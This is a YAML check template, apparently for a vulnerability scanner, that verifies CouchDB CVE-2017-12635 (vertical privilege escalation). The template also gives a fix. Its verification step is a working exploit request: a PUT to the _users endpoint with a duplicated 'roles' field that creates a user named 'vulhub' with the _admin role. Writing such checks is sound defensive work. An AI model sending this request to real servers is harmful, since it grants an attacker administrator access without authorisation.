app: CouchDB
query: body:"CouchDB"
meta:
  name: couchdb-cve-2017-12635 垂直越权漏洞
  level: 4
  tags:
    - ultra_vires
  description: 垂直越权漏洞
  homepage: http://couchdb.apache.org/
  author: 一曲成殇
  references: https://blog.csdn.net/Aaron_Miller/article/details/97114298
  solution: |-
    升级CouchDB的版本到1.7.1或2.1.1
    配置HTTP API参数，针对敏感信息加入黑名单
  steps:
    verify_steps:
      type: and
      verify:
        - request:
            method: PUT
            path: /_users/org.couchdb.user:vulhub
            redirect: false
            header:
              - Content-Length: "192"
              - Content-Type: application/json
            params: |2-
               {
                      "type": "user",
                      "name": "vulhub",
                      "roles": ["_admin"],
                      "roles": [],
                      "password": "fVyuyAECgYEAhgJzkPO1sTV1Dvs5bvls4tyVAsLy2I7wHKWJvJdDUpox2TnCMFT9"
                    }
          response:
            - name: code
              value: "201"
              type: equals
            - name: body
              value: 'org.couchdb.user:'
              type: contains
  create_at: "2021-11-06 21:39:46"
